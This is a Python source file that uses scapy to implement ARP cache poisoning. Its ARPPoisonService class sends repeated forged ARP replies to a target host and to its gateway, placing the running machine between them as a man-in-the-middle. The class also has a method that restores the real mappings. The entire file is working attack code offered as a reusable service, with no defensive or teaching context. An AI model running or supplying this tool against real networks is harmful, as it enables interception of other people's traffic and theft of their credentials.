from time import sleep
import multiprocessing

from scapy.all import *
from scapy.layers.l2 import ARP

from network.network_utils import get_mac

ARP_REQUEST = 1
ARP_REPLY = 2
ARP_REQUEST_TIMEOUT = 5  # seconds
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

logging.getLogger(scapy.__name__).setLevel(logging.ERROR)
logging.basicConfig(format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p', level=logging.INFO)
logger = logging.getLogger()


class ARPPoisonService:
    POISON_COLLAPSE_TIMEOUT = 5
    @staticmethod
    def _poison_arp_cache(target_ip, target_mac, ip_to_spoof):
        """
        function sets targets arp cache so that source_ip resolves to this machine's MAC
        :param target_ip: IP destination for our poisoned ARP reply
        :param target_mac: MAC destination for our poisoned ARP reply (so to not trigger additional ARP query)
        :param ip_to_spoof: IP to edit in target arp cache
        """
        spoofed = ARP(op=ARP_REPLY, pdst=target_ip, psrc=ip_to_spoof, hwdst=target_mac)
        send(spoofed, verbose=False)

    @staticmethod
    def _reset_arp_cache(target_ip, target_mac, source_ip, source_mac):
        reset = ARP(op=ARP_REPLY, hwsrc=source_mac, psrc=source_ip, hwdst=target_mac, pdst=target_ip)
        send(reset, verbose=False)

    def __init__(self, target_ip, gateway_ip, target_mac=None, gateway_mac=None, interval=5, mac_resolve_max_tries=5):
        """
        :param target_ip: will intercept requests from this IP
        :param gateway_ip: will intercept responses from this IP (directed at :param target_ip)
        :param interval: how often to run arp poison
        """
        self.target_ip = target_ip
        self.target_mac = target_mac or get_mac(self.target_ip, mac_resolve_max_tries)

        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac or get_mac(self.gateway_ip, mac_resolve_max_tries)

        self.interval = interval
        self._should_spoof = False
        self._spoof_thread = None

    def _run_mitm(self):
        """
        inserts this machine between target_ip and gateway_ip
        """
        while self._should_spoof:
            type(self)._poison_arp_cache(self.target_ip, self.target_mac, self.gateway_ip)
            type(self)._poison_arp_cache(self.gateway_ip, self.gateway_mac, self.target_ip)
            sleep(self.interval)

    def _restore_normal_arp(self):
        """
        resets ip/mac mapping so that gateway ip resolves to gateway mac, and target ip resolves to target mac
        """
        type(self)._reset_arp_cache(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac)
        type(self)._reset_arp_cache(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)

    def start_mitm(self):
        logger.info("starting spoof")

        self._should_spoof = True
        self._spoof_thread = multiprocessing.Process(target=self._run_mitm, args=())
        self._spoof_thread.start()

    def stop_mitm(self):
        self._should_spoof = False
        self._spoof_thread.join(type(self).POISON_COLLAPSE_TIMEOUT)
        if self._spoof_thread.is_alive():
            self._spoof_thread.terminate()
        self._restore_normal_arp()
